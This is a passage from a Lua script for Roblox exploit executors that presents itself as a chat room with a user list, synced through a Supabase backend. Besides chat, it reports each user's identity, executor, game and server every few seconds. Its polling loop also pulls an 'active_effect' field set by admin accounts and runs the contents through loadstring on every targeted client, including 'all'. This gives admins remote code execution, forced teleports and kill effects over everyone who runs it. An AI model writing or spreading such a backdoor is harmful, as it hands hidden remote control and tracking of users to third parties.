        Subtitle.TextColor3 = Color3.fromRGB(90, 94, 102)
    end
    Subtitle.Parent = PlayerRow

    if online and uName ~= Username then
        if inSameServer then
            local TpBtn = Instance.new("TextButton")
            TpBtn.Size = UDim2.new(0, 50, 0, 26)
            TpBtn.Position = UDim2.new(1, -115, 0, 11)
            TpBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
            TpBtn.Text = "⚡ TP"
            TpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            TpBtn.Font = Enum.Font.GothamBold
            TpBtn.TextSize = 10
            TpBtn.Parent = PlayerRow
            Instance.new("UICorner", TpBtn).CornerRadius = UDim.new(0, 4)
            TpBtn.MouseButton1Click:Connect(function()
                local p = Players:FindFirstChild(uName)
                if p and teleportToPlayerInServer(p) then
                    showToast("Teleported to " .. uName, Color3.fromRGB(35, 165, 90))
                else
                    showToast("Player not found in server", Color3.fromRGB(237, 66, 69))
                end
            end)

            local SpecBtn = Instance.new("TextButton")
            SpecBtn.Size = UDim2.new(0, 50, 0, 26)
            SpecBtn.Position = UDim2.new(1, -60, 0, 11)
            SpecBtn.BackgroundColor3 = Color3.fromRGB(48, 50, 56)
            SpecBtn.Text = "👁️ Watch"
            SpecBtn.TextColor3 = Color3.fromRGB(220, 222, 226)
            SpecBtn.Font = Enum.Font.GothamBold
            SpecBtn.TextSize = 10
            SpecBtn.Parent = PlayerRow
            Instance.new("UICorner", SpecBtn).CornerRadius = UDim.new(0, 4)
            SpecBtn.MouseButton1Click:Connect(function()
                local p = Players:FindFirstChild(uName)
                if p and spectatePlayer(p) then
                    SpectateText.Text = "👁️ Spectating: " .. uName
                    SpectateHud.Visible = true
                    showToast("Spectating " .. uName, Color3.fromRGB(88, 101, 242))
                else
                    showToast("Could not spectate", Color3.fromRGB(237, 66, 69))
                end
            end)
        else
            local JoinBtn = Instance.new("TextButton")
            JoinBtn.Size = UDim2.new(0, 68, 0, 26)
            JoinBtn.Position = UDim2.new(1, -78, 0, 11)
            JoinBtn.BackgroundColor3 = Color3.fromRGB(35, 165, 90)
            JoinBtn.Text = "🚀 Join"
            JoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            JoinBtn.Font = Enum.Font.GothamBold
            JoinBtn.TextSize = 10
            JoinBtn.Parent = PlayerRow
            Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0, 4)
            JoinBtn.MouseButton1Click:Connect(function()
                if user.place_id and user.job_id then
                    showToast("Teleporting to " .. uName .. "...", Color3.fromRGB(35, 165, 90))
                    TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LocalPlayer)
                end
            end)
        end
    end
end

local function refreshUIList(data)
    if not data then return end
    cachedUsersData = data
    for _, child in ipairs(UsersScroller:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end
    for _, child in ipairs(TargetScroller:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end

    local onlineList = {}
    local offlineList = {}
    local seen = {}
    local q = string.lower(searchQuery)

    for _, user in ipairs(data) do
        local uName = tostring(user.username or "Unknown")
        if not seen[uName] then
            seen[uName] = true
            local gameStr = string.lower(tostring(user.current_game or ""))
            local execStr = string.lower(tostring(user.executor or ""))
            local nameStr = string.lower(uName)

            local matches = (q == "") or string.find(nameStr, q, 1, true) or string.find(gameStr, q, 1, true) or string.find(execStr, q, 1, true)
            if matches then
                if isUserOnline(user.updated_at) then
                    table.insert(onlineList, user)
                else
                    table.insert(offlineList, user)
                end
            end
        end
    end

    OnlineCounterText.Text = string.format("🟢 %d Online • %d Total", #onlineList, #onlineList + #offlineList)
    ChannelUsers.Text = string.format("   👥  users-network  (%d)", #onlineList)

    createCategoryHeader("Online Network — " .. #onlineList, Color3.fromRGB(35, 165, 90))
    for _, user in ipairs(onlineList) do
        createUserRow(user, true)

        local uName = tostring(user.username or "Unknown")
        if uName ~= Username then
            local TargetSelectorBtn = Instance.new("TextButton")
            TargetSelectorBtn.Size = UDim2.new(1, -10, 0, 34)
            TargetSelectorBtn.BackgroundColor3 = (SelectedTarget == uName) and Color3.fromRGB(53, 55, 60) or Color3.fromRGB(35, 37, 42)
            TargetSelectorBtn.Text = "      🟢 " .. uName
            TargetSelectorBtn.TextColor3 = Color3.fromRGB(219, 222, 225)
            TargetSelectorBtn.Font = Enum.Font.GothamSemibold
            TargetSelectorBtn.TextSize = 11
            TargetSelectorBtn.TextXAlignment = Enum.TextXAlignment.Left
            TargetSelectorBtn.Parent = TargetScroller
            Instance.new("UICorner", TargetSelectorBtn).CornerRadius = UDim.new(0, 4)

            local targetThumb = Instance.new("ImageLabel")
            targetThumb.Size = UDim2.new(0, 22, 0, 22)
            targetThumb.Position = UDim2.new(0, 6, 0.5, -11)
            targetThumb.BackgroundTransparency = 1
            targetThumb.Image = getAvatarThumb(user.user_id, uName)
            targetThumb.Parent = TargetSelectorBtn
            Instance.new("UICorner", targetThumb).CornerRadius = UDim.new(1, 0)

            TargetSelectorBtn.MouseButton1Click:Connect(function()
                SelectedTarget = uName
                ActiveTargetTitle.Text = "Selected Target: " .. uName
                for _, btn in ipairs(TargetScroller:GetChildren()) do
                    if btn:IsA("TextButton") then btn.BackgroundColor3 = Color3.fromRGB(35, 37, 42) end
                end
                TargetSelectorBtn.BackgroundColor3 = Color3.fromRGB(53, 55, 60)
            end)
        end
    end

    if (IsAdmin or IsSubAdmin) and #offlineList > 0 then
        createCategoryHeader("Offline Registry (Admin History) — " .. #offlineList, Color3.fromRGB(110, 115, 122))
        for _, user in ipairs(offlineList) do
            createUserRow(user, false)
        end
    end
end

SearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    searchQuery = SearchBox.Text
    refreshUIList(cachedUsersData)
end)

SearchClearBtn.MouseButton1Click:Connect(function()
    SearchBox.Text = ""
    searchQuery = ""
    refreshUIList(cachedUsersData)
end)

local function refreshChatUI(messages, adminPool)
    for _, child in ipairs(ChatScrolling:GetChildren()) do if child:IsA("Frame") then child:Destroy() end end

    local hasMention = false
    for _, msg in ipairs(messages) do
        local uName = tostring(msg.username or "Unknown")
        local displayMsg = sanitizeText(msg.message)
        local timeStr = formatIsoToTime(msg.created_at)
        local isMentioned = string.find(string.lower(displayMsg), "@" .. string.lower(Username), 1, true) ~= nil
        if isMentioned and uName ~= Username then hasMention = true end

        local uExec = cachedUserExecutors[uName]
        if not uExec or uExec == "" then
            for _, h in ipairs(cachedHistoryData) do
                if h.username == uName and h.executor then
                    uExec = h.executor
                    break
                end
            end
        end
        uExec = uExec or "Exec"

        local MsgFrame = Instance.new("Frame")
        MsgFrame.Size = UDim2.new(1, 0, 0, 0)
        MsgFrame.AutomaticSize = Enum.AutomaticSize.Y
        MsgFrame.BackgroundColor3 = isMentioned and Color3.fromRGB(50, 44, 30) or Color3.fromRGB(35, 37, 42)
        MsgFrame.BackgroundTransparency = isMentioned and 0.4 or 1
        MsgFrame.BorderSizePixel = 0
        MsgFrame.Parent = ChatScrolling
        Instance.new("UICorner", MsgFrame).CornerRadius = UDim.new(0, 6)

        local pad = Instance.new("UIPadding", MsgFrame)
        pad.PaddingTop = UDim.new(0, 4)
        pad.PaddingBottom = UDim.new(0, 4)
        pad.PaddingLeft = UDim.new(0, 6)
        pad.PaddingRight = UDim.new(0, 6)

        if isMentioned then
            local accent = Instance.new("Frame")
            accent.Size = UDim2.new(0, 3, 1, 0)
            accent.Position = UDim2.new(0, -6, 0, 0)
            accent.BackgroundColor3 = Color3.fromRGB(250, 166, 26)
            accent.BorderSizePixel = 0
            accent.Parent = MsgFrame
        end

        local AvatarBtn = Instance.new("ImageButton")
        AvatarBtn.Size = UDim2.new(0, 32, 0, 32)
        AvatarBtn.Position = UDim2.new(0, 0, 0, 0)
        AvatarBtn.BackgroundColor3 = Color3.fromRGB(24, 25, 28)
        AvatarBtn.BorderSizePixel = 0
        AvatarBtn.Image = getAvatarThumb(cachedUserIds[uName], uName)
        AvatarBtn.Parent = MsgFrame
        Instance.new("UICorner", AvatarBtn).CornerRadius = UDim.new(1, 0)

        AvatarBtn.MouseButton1Click:Connect(function()
            local found = nil
            for _, u in ipairs(cachedUsersData) do
                if u.username == uName then
                    found = u
                    break
                end
            end
            if not found then
                found = {
                    username = uName,
                    user_id = cachedUserIds[uName] or 0,
                    is_admin = adminPool[uName] or false,
                    updated_at = msg.created_at,
                    current_game = "Unknown",
                    executor = uExec,
                    job_id = msg.job_id or "none",
                    place_id = PlaceId
                }
            end
            openUserProfile(found)
        end)

        local ContentFrame = Instance.new("Frame")
        ContentFrame.Size = UDim2.new(1, -40, 0, 0)
        ContentFrame.Position = UDim2.new(0, 40, 0, 0)
        ContentFrame.AutomaticSize = Enum.AutomaticSize.Y
        ContentFrame.BackgroundTransparency = 1
        ContentFrame.Parent = MsgFrame

        local HeaderLine = Instance.new("Frame")
        HeaderLine.Size = UDim2.new(1, 0, 0, 18)
        HeaderLine.BackgroundTransparency = 1
        HeaderLine.Parent = ContentFrame

        local HeaderLayout = Instance.new("UIListLayout", HeaderLine)
        HeaderLayout.FillDirection = Enum.FillDirection.Horizontal
        HeaderLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        HeaderLayout.SortOrder = Enum.SortOrder.LayoutOrder
        HeaderLayout.Padding = UDim.new(0, 6)

        local NameBtn = Instance.new("TextButton")
        NameBtn.LayoutOrder = 1
        NameBtn.Size = UDim2.new(0, 0, 1, 0)
        NameBtn.AutomaticSize = Enum.AutomaticSize.X
        NameBtn.BackgroundTransparency = 1
        NameBtn.Font = Enum.Font.GothamBold
        NameBtn.TextSize = 12
        NameBtn.TextXAlignment = Enum.TextXAlignment.Left

        if adminPool[uName] then
            NameBtn.TextColor3 = Color3.fromRGB(255, 235, 59)
            NameBtn.Text = "👑 " .. uName
        elseif uName == Username then
            NameBtn.TextColor3 = Color3.fromRGB(88, 101, 242)
            NameBtn.Text = uName
        else
            NameBtn.TextColor3 = Color3.fromRGB(242, 243, 245)
            NameBtn.Text = uName
        end
        NameBtn.Parent = HeaderLine

        NameBtn.MouseButton1Click:Connect(function()
            TextBox.Text = TextBox.Text .. "@" .. uName .. " "
            TextBox:CaptureFocus()
        end)

        local ChatExecBadge = Instance.new("Frame")
        ChatExecBadge.LayoutOrder = 2
        ChatExecBadge.Size = UDim2.new(0, 0, 0, 15)
        ChatExecBadge.AutomaticSize = Enum.AutomaticSize.X
        ChatExecBadge.BackgroundColor3 = getExecutorBadgeColor(uExec)
        ChatExecBadge.BorderSizePixel = 0
        ChatExecBadge.Parent = HeaderLine
        Instance.new("UICorner", ChatExecBadge).CornerRadius = UDim.new(0, 3)

        local ChatExecText = Instance.new("TextLabel")
        ChatExecText.Size = UDim2.new(0, 0, 1, 0)
        ChatExecText.AutomaticSize = Enum.AutomaticSize.X
        ChatExecText.BackgroundTransparency = 1
        ChatExecText.Font = Enum.Font.GothamBold
        ChatExecText.TextSize = 9
        ChatExecText.TextColor3 = Color3.fromRGB(255, 255, 255)
        ChatExecText.Text = " ⚙️ " .. uExec .. " "
        ChatExecText.Parent = ChatExecBadge

        local TimeLabel = Instance.new("TextLabel")
        TimeLabel.LayoutOrder = 3
        TimeLabel.Size = UDim2.new(0, 0, 1, 0)
        TimeLabel.AutomaticSize = Enum.AutomaticSize.X
        TimeLabel.BackgroundTransparency = 1
        TimeLabel.Text = timeStr
        TimeLabel.TextColor3 = Color3.fromRGB(120, 125, 134)
        TimeLabel.Font = Enum.Font.Gotham
        TimeLabel.TextSize = 10
        TimeLabel.Parent = HeaderLine

        local MsgText = Instance.new("TextLabel")
        MsgText.Size = UDim2.new(1, 0, 0, 0)
        MsgText.Position = UDim2.new(0, 0, 0, 20)
        MsgText.AutomaticSize = Enum.AutomaticSize.Y
        MsgText.BackgroundTransparency = 1
        MsgText.Font = Enum.Font.Gotham
        MsgText.TextSize = 13
        MsgText.TextColor3 = Color3.fromRGB(219, 222, 225)
        MsgText.TextXAlignment = Enum.TextXAlignment.Left
        MsgText.TextWrapped = true
        MsgText.RichText = true
        MsgText.Text = displayMsg
        MsgText.Parent = ContentFrame
    end

    if #messages > lastChatCount and lastChatCount > 0 then
        if hasMention then
            playSound("rbxassetid://9114223177", 0.6)
        else
            playSound("rbxassetid://6895079853", 0.35)
        end
    end
    lastChatCount = #messages
end

local function updatePresence()
    if not running then return end
    pcall(function()
        request({
            Url = SUPABASE_URL .. "/rest/v1/executor_sync?on_conflict=username",
            Method = "POST",
            Headers = {
                ["apikey"] = SUPABASE_KEY,
                ["Authorization"] = "Bearer " .. SUPABASE_KEY,
                ["Content-Type"] = "application/json",
                ["Prefer"] = "resolution=merge-duplicates"
            },
            Body = HttpService:JSONEncode({
                user_id = UserId,
                username = Username,
                job_id = JobId,
                place_id = PlaceId,
                current_game = gameName,
                executor = myExecutor,
                updated_at = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                teleport_target = _G.CurrentTpTarget,
                active_effect = _G.CurrentActiveEffect
            })
        })
    end)
end

local function logExecutorHistory()
    if not running then return end
    if myExecutor == lastLoggedExecutor and gameName == lastLoggedGame then return end
    lastLoggedExecutor = myExecutor
    lastLoggedGame = gameName

    pcall(function()
        request({
            Url = SUPABASE_URL .. "/rest/v1/executor_history",
            Method = "POST",
            Headers = {
                ["apikey"] = SUPABASE_KEY,
                ["Authorization"] = "Bearer " .. SUPABASE_KEY,
                ["Content-Type"] = "application/json",
                ["Prefer"] = "return=minimal"
            },
            Body = HttpService:JSONEncode({
                user_id = UserId,
                username = Username,
                executor = myExecutor,
                current_game = gameName,
                place_id = PlaceId,
                job_id = JobId,
                logged_at = os.date("!%Y-%m-%dT%H:%M:%SZ")
            })
        })
    end)
end

local function fetchExecutorHistory()
    if not running then return nil end
    local res = nil
    pcall(function()
        res = request({
            Url = SUPABASE_URL .. "/rest/v1/executor_history?order=logged_at.desc&limit=100",
            Method = "GET",
            Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
        })
    end)
    if res and res.StatusCode == 200 then
        local s, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if s and type(data) == "table" and #data > 0 then
            return data
        end
    end
    return nil
end

local function sendChatMessage(text)
    local cleanMsg = sanitizeText(text)
    if cleanMsg == "" then return end
    if tick() - lastChatTime < 1.5 then
        showToast("Sending too fast, please wait...", Color3.fromRGB(237, 66, 69))
        return
    end
    lastChatTime = tick()

    if string.sub(cleanMsg, 1, 3) == "/e " then
        pcall(function() Players:Chat(cleanMsg) end)
    end

    local targetPayload = { username = Username, message = cleanMsg }
    if currentTab == "server" then targetPayload.job_id = JobId end

    pcall(function()
        request({
            Url = SUPABASE_URL .. "/rest/v1/executor_chat",
            Method = "POST",
            Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY, ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(targetPayload)
        })
    end)
end

fetchData = function()
    if not running then return end

    local resUser = nil
    pcall(function()
        resUser = request({
            Url = SUPABASE_URL .. "/rest/v1/executor_sync?select=user_id,username,executor,teleport_target,active_effect,is_admin,is_sub_admin,current_game,job_id,place_id,updated_at&order=updated_at.desc&limit=5000",
            Method = "GET",
            Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
        })
    end)

    local adminPool = {}
    if resUser and resUser.StatusCode == 200 then
        local success, users = pcall(function() return HttpService:JSONDecode(resUser.Body) end)
        if success and type(users) == "table" then
            for _, u in ipairs(users) do
                if u.user_id then cachedUserIds[u.username] = u.user_id end
                if u.executor then cachedUserExecutors[u.username] = u.executor end
                if u.username and u.executor then trackUserExecutor(u.username, u.executor) end
                if u.is_admin == true or u.is_sub_admin == true then
                    adminPool[u.username] = true
                end
                if u.user_id == UserId or u.username == Username then
                    IsAdmin = (u.is_admin == true)
                    IsSubAdmin = (u.is_sub_admin == true)
                    local canAccessExec = (IsAdmin or IsSubAdmin) and (ADMIN_KEY ~= "")
                    ChannelExecPanel.Visible = canAccessExec
                    CatAdmin.Visible = canAccessExec
                end
            end
            cachedUserExecutors[Username] = myExecutor
            cachedAdminPool = adminPool
            refreshUIList(users)

            for _, user in ipairs(users) do
                if user.teleport_target ~= "none" and (user.teleport_target == Username or user.teleport_target == "all") then
                    if tick() - lastTeleportTime > 5 then
                        if user.is_admin == true or user.is_sub_admin == true then
                            lastTeleportTime = tick()
                            TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LocalPlayer)
                        end
                    end
                end

                if user.active_effect and user.active_effect ~= "none" then
                    local delimiterIndex = string.find(user.active_effect, "||PAYLOAD||")
                    if delimiterIndex then
                        local headerPart = string.sub(user.active_effect, 1, delimiterIndex - 1)
                        local payloadPart = string.sub(user.active_effect, delimiterIndex + 11)

                        local cmdData = string.split(headerPart, ":")
                        local action = cmdData[1]
                        local target = cmdData[2]
                        local uniqueHash = cmdData[3]

                        if uniqueHash and not handledCommands[uniqueHash] then
                            if user.is_admin == true or user.is_sub_admin == true then
                                handledCommands[uniqueHash] = true
                                if action == "runcode" and (target == Username or target == "all") then
                                    local decodedCode = cleanUrlDecode(payloadPart)
                                    local executable, execError = loadstring(decodedCode)
                                    if executable then
                                        task.spawn(executable)
                                    else
                                        warn("Execution String Error: " .. tostring(execError))
                                    end
                                end
                            end
                        end
                    else
                        local cmdData = string.split(user.active_effect, ":")
                        local action = cmdData[1]
                        local target = cmdData[2]
                        local uniqueHash = cmdData[3]

                        if uniqueHash and not handledCommands[uniqueHash] then
                            if user.is_admin == true or user.is_sub_admin == true then
                                handledCommands[uniqueHash] = true
                                if action == "kill" or action == "explode" then
                                    if target == Username or target == "all" then
                                        runLocalExplosionEffect(Username)
                                    else
                                        runLocalExplosionEffect(target)
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    local queryFilter = (currentTab == "global") and "job_id=is.null" or "job_id=eq." .. JobId
    local resChat = nil
    pcall(function()
        resChat = request({
            Url = SUPABASE_URL .. "/rest/v1/executor_chat?" .. queryFilter .. "&order=created_at.desc&limit=30",
            Method = "GET",
            Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
        })
    end)

    if resChat and resChat.StatusCode == 200 then
        local success, msgs = pcall(function() return HttpService:JSONDecode(resChat.Body) end)
        if success and type(msgs) == "table" then
            local orderedMsgs = {}
            for i = #msgs, 1, -1 do table.insert(orderedMsgs, msgs[i]) end
            refreshChatUI(orderedMsgs, adminPool)
        end
    end

    if tick() - lastHistoryFetch > 15 then
        lastHistoryFetch = tick()
        logExecutorHistory()
        local hData = fetchExecutorHistory()
        if hData then
            cachedHistoryData = hData
            for _, h in ipairs(hData) do
                if h.username and h.executor then trackUserExecutor(h.username, h.executor) end
            end
            saveLocalExecHistory()
        end
        if currentTab == "history" then
            refreshHistoryUI(cachedHistoryData, cachedUsersData)
        end
    end
end

local function handleSendMessage()
    local text = TextBox.Text
    if text and text:match("%S") then
        TextBox.Text = ""
        task.spawn(function()
            sendChatMessage(text)
            fetchData()
        end)
    end
end

TextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        handleSendMessage()
    end
end)

SendBtn.MouseButton1Click:Connect(function()
    handleSendMessage()
end)

BringBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
        _G.CurrentTpTarget = SelectedTarget
        updatePresence()
        showToast("Dispatched Bring target: " .. SelectedTarget, Color3.fromRGB(88, 101, 242))
        task.delay(3, function()
            if _G.CurrentTpTarget == SelectedTarget then
                _G.CurrentTpTarget = "none"
                updatePresence()
            end
        end)
    end
end)

TeleportToMeBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
        local hash = tostring(os.time() .. math.random(1,1000))
        local code = string.format([[
            local admin = game.Players:FindFirstChild("%s")
            if admin and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") then
                local myChar = game.Players.LocalPlayer.Character
                local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                if myHrp then
                    if myHum then myHum.Sit = false end
                    myHrp.CFrame = admin.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                    myHrp.AssemblyLinearVelocity = Vector3.zero
                end
            end
        ]], Username)
        local payloadClean = HttpService:UrlEncode(code)
        _G.CurrentActiveEffect = "runcode:" .. SelectedTarget .. ":" .. hash .. "||PAYLOAD||" .. payloadClean
        updatePresence()
        showToast("Dispatched Teleport To Me: " .. SelectedTarget, Color3.fromRGB(35, 165, 90))
        task.delay(4, function()
            if _G.CurrentActiveEffect:sub(1,7) == "runcode" then
                _G.CurrentActiveEffect = "none"
                updatePresence()
            end
        end)
    end
end)

RemoteKillBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
        local hash = tostring(os.time() .. math.random(1,1000))
        _G.CurrentActiveEffect = "kill:" .. SelectedTarget .. ":" .. hash
        runLocalExplosionEffect(SelectedTarget)
        updatePresence()
        showToast("Dispatched Remote Kill: " .. SelectedTarget, Color3.fromRGB(242, 63, 67))
        task.delay(3, function()
            if _G.CurrentActiveEffect:sub(1,4) == "kill" then
                _G.CurrentActiveEffect = "none"
                updatePresence()
            end
        end)
    end
end)

RemoteExplodeBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" then
        local hash = tostring(os.time() .. math.random(1,1000))
        _G.CurrentActiveEffect = "explode:" .. SelectedTarget .. ":" .. hash
        runLocalExplosionEffect(SelectedTarget)
        updatePresence()
        showToast("Dispatched Remote Explode: " .. SelectedTarget, Color3.fromRGB(230, 126, 34))
        task.delay(3, function()
            if _G.CurrentActiveEffect:sub(1,7) == "explode" then
                _G.CurrentActiveEffect = "none"
                updatePresence()
            end
        end)
    end
end)

RemoteExecuteCodeBtn.MouseButton1Click:Connect(function()
    if (IsAdmin or IsSubAdmin) and ADMIN_KEY ~= "" and SelectedTarget ~= "none" and CodeBox.Text ~= "" then
        local hash = tostring(os.time() .. math.random(1,1000))
        local payloadClean = HttpService:UrlEncode(CodeBox.Text)

        _G.CurrentActiveEffect = "runcode:" .. SelectedTarget .. ":" .. hash .. "||PAYLOAD||" .. payloadClean
        updatePresence()
        showToast("Deployed Execution String to: " .. SelectedTarget, Color3.fromRGB(35, 165, 90))

        task.delay(4, function()
            if _G.CurrentActiveEffect:sub(1,7) == "runcode" then
                _G.CurrentActiveEffect = "none"
                updatePresence()
            end
        end)
    end
end)

local dragging, dragInput, dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = WindowFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        WindowFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and (input.KeyCode == Enum.KeyCode.RightControl or input.KeyCode == Enum.KeyCode.Insert) then
        WindowFrame.Visible = not WindowFrame.Visible
        showToast(WindowFrame.Visible and "Chat Room opened" or "Chat Room hidden (Press R-Ctrl or Insert)", Color3.fromRGB(148, 155, 164))
    end
end)

SoundBtn.MouseButton1Click:Connect(function()
    soundEnabled = not soundEnabled
    SoundBtn.Text = soundEnabled and "🔊" or "🔇"
    showToast(soundEnabled and "Chat sounds enabled" or "Chat sounds muted", Color3.fromRGB(148, 155, 164))
end)

local minimized = false
MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    BodyFrame.Visible = not minimized
    WindowFrame.Size = minimized and UDim2.new(0, 780, 0, 38) or UDim2.new(0, 780, 0, 500)
    MinBtn.Text = minimized and "+" or "-"
end)

SpectateStopBtn.MouseButton1Click:Connect(function()
    stopSpectate()
    SpectateHud.Visible = false
    showToast("Stopped spectating", Color3.fromRGB(237, 66, 69))
end)

CloseBtn.MouseButton1Click:Connect(function()
    running = false
    stopSpectate()
    pcall(function() SpectateHud:Destroy() end)
    pcall(function() ScreenGui:Destroy() end)
end)

updatePresence()
logExecutorHistory()
fetchData()

task.spawn(function()
    while running do
        task.wait(4)
        updatePresence()
        fetchData()
    end
end)
